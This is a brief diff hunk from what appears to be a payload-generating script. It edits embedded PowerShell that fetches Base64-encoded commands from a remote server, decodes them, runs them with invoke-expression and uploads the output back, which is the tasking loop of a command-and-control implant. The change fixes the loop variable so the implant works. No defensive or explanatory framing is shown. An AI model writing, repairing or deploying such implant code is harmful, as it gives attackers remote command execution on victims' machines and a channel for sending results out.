@@ -51,7 +51,7 @@ code =   """
             $d = [System.Convert]::FromBase64String($r_get);
             $Ds = [System.Text.Encoding]::UTF8.GetString($d);
 
-	        while($r) {{
+	        while($r_get) {{
 		        $output = invoke-expression $Ds | out-string
 		        $w.UploadString($resp, $output)
 		        break
